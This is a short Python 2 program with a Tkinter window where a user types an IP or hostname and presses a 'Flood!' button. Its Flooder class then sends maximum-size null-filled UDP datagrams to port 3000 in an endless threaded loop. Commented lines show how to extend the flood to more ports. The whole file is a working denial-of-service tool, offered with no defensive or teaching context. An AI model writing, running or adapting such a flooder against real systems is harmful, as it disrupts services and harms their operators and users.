from Tkinter import *
import socket
import threading

class Flooder:
  def __init__(self, ip, port):
    self.host = ip
    self.port = port
    self.size = 1024
    self.socket = None
    
    try:
      self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error:
      print "error open socket"

        

  def spam(self):
    buff = 65507 * '\0'

    while 1:
      self.socket.sendto(buff, (self.host, self.port))

class FlooderGUI:
  def __init__(self, master):
    frame = Frame(master)
    frame.pack()

    self.entry = Entry(frame, fg="black")
    self.entry.insert(0, "Enter IP or hostname ID")
    self.entry.grid(row=1, column = 1, sticky=W, pady=5)

    self.button = Button(frame, text="Flood!", fg="red", command=self.flood)
    self.button.grid(row=2, column=1, sticky=W)

    img = PhotoImage(file="narga_h.gif")
    self.narga_map = Label(frame, image=img)
    self.narga_map.image = img
    self.narga_map.grid(row=0, column = 1)
    
  def flood(self):
    ip = self.entry.get()
    flooders = []

    f1 = Flooder(ip, 3000) #it is better to concentrate flooding on one port
    flooders.append(f1)
    #f2 = Flooder(ip, 3001) #but we have the option of doing it on more ports
    #flooders.append(f2)
    #f3 = Flooder(ip, 3002)
    #flooders.append(f3)

    threads = []

    for i in flooders:
      spam_thread = threading.Thread(target = i.spam)
      spam_thread.setDaemon(True) #true since if GUI goes down these should go down
      spam_thread.start()
      threads.append(spam_thread)

if __name__ == '__main__':
  root = Tk()
  app = FlooderGUI(root)
  root.mainloop()
